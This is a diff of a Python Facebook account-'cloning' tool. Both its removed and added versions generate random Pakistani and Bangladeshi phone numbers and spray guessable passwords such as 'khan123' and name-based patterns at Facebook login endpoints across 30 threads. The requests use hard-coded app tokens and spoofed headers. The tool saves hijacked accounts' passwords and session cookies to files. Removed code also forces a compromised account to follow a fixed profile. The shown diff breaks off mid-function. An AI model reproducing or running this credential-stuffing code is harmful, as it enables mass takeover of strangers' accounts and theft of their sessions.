-    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
-    get = r.find('a', string='Follow').get('href')
-    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
-
-
-
-
-
-
-
-def passx():
-    os.system("clear")
-    print(logo)
-    print('           \x1b[97m[\033[37;41m  P A S S   M E N U   \033[0;m] ')
-    print("")
-    print(f"{RED}[01] {WHITE}AUTO PASS 7 DIGITS         {GREEN}[FASTEST]")
-    print(f"{RED}[02] {WHITE}AUTO PASS 7 AND 11 DIGITS  {GREEN}[FAST]")
-    print(f"{RED}[03] {WHITE}AUTO PASS 7 DIGIT AND KHAN {GREEN}[FAST]")
-    print(f"{RED}[04] {WHITE}ONLY KHAN PASS             {GREEN}[SLOWEST]")
-    print(f"{RED}[05] {WHITE}KHAN & ALI MIX PASS        {GREEN}[SLOWEST]")
-    print(f"{RED}[06] {WHITE}KHAN & MALIK MIX PASS      {GREEN}[SLOWEST]")
-    print(f"\033[1;91m====================================================")
-    SHANTO = input("[√] CHOOSE : ")
-    if SHANTO in ["1","01"]:
-        pass1()
-    elif SHANTO in ["2","02"]:
-        pass2()
-    elif SHANTO in ["3","03"]:
-        pass3()
-    elif SHANTO in ["4","04"]:
-        pass4()
-    elif SHANTO in ["5","05"]:
-        pass5()
-    elif SHANTO in ["6","06"]:
-        pass6()
-    else:
-        print('\033[1;31mINCORECT OPTION !!');main()
-
-
-
-def pass1():
-    os.system("clear")
-    jalan(logo)
-    print(f"")
-    clear()
-    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
-    print(f"")
-    linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
-    print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
-    linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
-    linex()
-    code = input(' PUT CODE : ')
-    os.system("clear")
-    print(logo)
-    print(f"")
-    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
-    print(f"")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
-        clear()
-        tl = str(len(user))
-        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P1   ")
-        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
-        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
-        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
-        print(f'{RED}======================================================')
-        for love in user:
-            uid = code+love
-            pwx = [love,]
-            manshera.submit(freeq,uid,pwx,tl)
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/SHANTO-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/SHANTO-CP.txt')
-    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
-
-
-
-
-
-
-
-
-def pass2():
-    os.system("clear")
-    jalan(logo)
-    print(f"")
-    clear()
-    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
-    print(f"")
-    linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
-    print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
-    linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
-    linex()
-    code = input(' PUT CODE : ')
-    os.system("clear")
-    print(logo)
-    print(f"")
-    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
-    print(f"")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
-        clear()
-        tl = str(len(user))
-        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P2 ")
-        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
-        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
-        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
-        print(f'{RED}======================================================')
-        for love in user:
-            uid = code+love
-            pwx = [love,uid]
-            manshera.submit(freeq,uid,pwx,tl)
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/SHANTO-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/SHANTO-CP.txt')
-    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
-
-
-
-
-def pass3():
-    os.system("clear")
-    jalan(logo)
-    print(f"")
-    clear()
-    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
-    print(f"")
-    linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
-    print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
-    linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
-    linex()
-    code = input(' PUT CODE : ')
-    os.system("clear")
-    print(logo)
-    print(f"")
-    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
-    print(f"")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
-        clear()
-        tl = str(len(user))
-        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P3 ")
-        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
-        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
-        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
-        print(f'{RED}======================================================')
-        for love in user:
-            uid = code+love
-            pwx = [love,'khankhan']
-            manshera.submit(freeq,uid,pwx,tl)
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/SHANTO-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/SHANTO-CP.txt')
-    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
-
-
-
-
-def pass4():
-    os.system("clear")
-    jalan(logo)
-    print(f"")
-    clear()
-    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
-    print(f"")
-    linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
-    print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
-    linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
-    linex()
-    code = input(' PUT CODE : ')
-    os.system("clear")
-    print(logo)
-    print(f"")
-    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
-    print(f"")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
-        clear()
-        tl = str(len(user))
-        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P4 ")
-        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
-        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
-        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
-        print(f'{RED}======================================================')
-        for love in user:
-            uid = code+love
-            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
-            manshera.submit(freeq,uid,pwx,tl)
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/SHANTO-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/SHANTO-CP.txt')
-    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
-
-
-
-
-
-def pass5():
-    os.system("clear")
-    jalan(logo)
-    print(f"")
-    clear()
-    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
-    print(f"")
-    linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
-    print(f"")
-    print(f' {GREEN}[!] BD SIM CODES : 017, 016, 019, 018')
-    print(f' {GREEN}[!]               : 017, 016, 019, 018')
-    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
-    linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
-    linex()
-    code = input(' PUT CODE : ')
-    os.system("clear")
-    print(logo)
-    print(f"")
-    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
-    print(f"")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
-        clear()
-        tl = str(len(user))
-        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P5 ")
-        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
-        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
-        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
-        print(f'{RED}======================================================')
-        for love in user:
-            uid = code+love
-            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
-            manshera.submit(freeq,uid,pwx,tl)
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/SHANTO-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/SHANTO-CP.txt')
-    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
-
-
-
-def pass6():
-    os.system("clear")
-    jalan(logo)
-    print(f"")
-    clear()
-    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
-    print(f"")
-    linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
-    print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
-    linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
-    linex()
-    code = input(' PUT CODE : ')
-    os.system("clear")
-    print(logo)
-    print(f"")
-    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
-    print(f"")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
-        clear()
-        tl = str(len(user))
-        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P6 ")
-        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
-        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
-        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
-        print(f'{RED}======================================================')
-        for love in user:
-            uid = code+love
-            pwx = ['khankhan','malikmalik','malik123','malik12','malik786']
-            manshera.submit(freeq,uid,pwx,tl)
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
-    print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/SHANTO-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/SHANTO-CP.txt')
-    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
-
-
-
-
-
-
-def freeq(uid,pwx,tl):
+def api1(ids,names,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])
+				print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				#print('\033[1;37m [🍪] Cookies :- '+cookies)
+				open('/sdcard/SATAN-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				oks.append(uid)
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = str(po['error']['error_data']['uid'])
+				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+def rd(ids,passlist):
+	try:
+		global oks,loop
+                
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
+		for pas in passlist:                                          
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
+			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])                                  
+				print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
+				open('/sdcard/SATAN-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
+				oks.append(uid)
+                                
+				break
+			elif 'www.facebook.com' in po['error']['message']:                                
+				uid = str(po['error']['error_data']['uid'])
+				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/SATAN-R-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+def bd1(ids,passlist):
     global loop
-    global ok
-    global cp
-    global ugen
+    global cps
+    global oks   
     try:
-        for ps in pwx:
-            bi = random.choice([A])
+        for ps in passlist:            
             session = requests.Session()
-            pro = random.choice(rug)
-            free_fb = session.get('https://free.facebook.com').text
+            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
+            pro = random.choice(S1())            
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1154,68 +595,105 @@ def freeq(uid,pwx,tl):
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number":"0",
             "unrecognized_tries":"0",
-            "email":uid,
+            "email":ids,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-            'authority': 'www.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'authority': 'developer.facebook.com',
+            'x-fb-rlafr': '0',
+            'access-control-allow-origin': '*',
+            'facebook-api-version': 'v17.0',
+            'strict-transport-security': 'max-age=15552000',
+            'pragma': 'no-cache',
+            'cache-control': 'private, no-cache, no-store, must-revalidate',
+            'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD',
+            'x-fb-trace-id': 'DKv719n6x5A',
+            'x-fb-rev': '1007660106',
+            'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'dpr': '2',
-            'referer': 'https://web.facebook.com/',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/',
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"13.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-site',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro,
-            'viewport-width': '980',
-}
-            lo = session.post('https://business.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            'user-agent': pro}
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                uid = coki[7:22]
-                ##os.system("play-audio SHANTO_OK.mp3")
-                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ '  ') 
-                cek_apk(session,coki)
-                open('/sdcard/SHANTO-OK.txt', 'a').write(uid+' | '+ps+'\n')
-                ok.append(uid)
+                cid = coki[7:22]
+                print('\r\r\033[1;32m [SATAN-OK] '+ids+' | '+ps)                
+                print('\033[1;37m [🍪] Cookies :- '+coki)                
+                open('/sdcard/SATAN-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
+                oks.append(cid)
+                break
             elif 'checkpoint' in log_cookies:
-                if 'Enter login code to continue' in log_cookies:
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    uid=coki[24:39]
-                    ##os.system("play-audio SHANTO_2F.mp3")
-                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/SHANTO-2F.txt', 'a').write(uid+' | '+ps+'\n')
-                    twf.append(uid)
-                else:
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    uid=coki[24:39]
-                    ##os.system("play-audio SHANTO_CP.mp3")
-                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' ')
-                    open('/sdcard/SHANTO-CP.txt', 'a').write(uid+' | '+ps+'\n')
-                    cp.append(uid)
-                    break
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                #print(f'\r\r\033[1;33m [SATAN-CP] '+ids+' | '+ps+'\033[1;97m')
+                open('/sdcard/SATAN-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
+                cps.append(cid)
+            elif twf in session.cookies.get_dict().keys():
+                print('\033[1;93m\033[0;34mSATAN-2F '+ids+' • '+ps+'  \033[0;97m')
+                break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[SHANTO 🔥] [%s] \33[1;97m[OK:%s{SHANTO2}CP:%s]'%(loop,len(ok),len(cp))), 
-        sys.stdout.flush()
-    except:
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
         pass
 
 
 
-
-#---------------------[END MENU]---------------------#
-if __name__ == '__main__':
-    main()
+def newidx(ids,names,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			head = {"User-Agent": S1(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
+			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
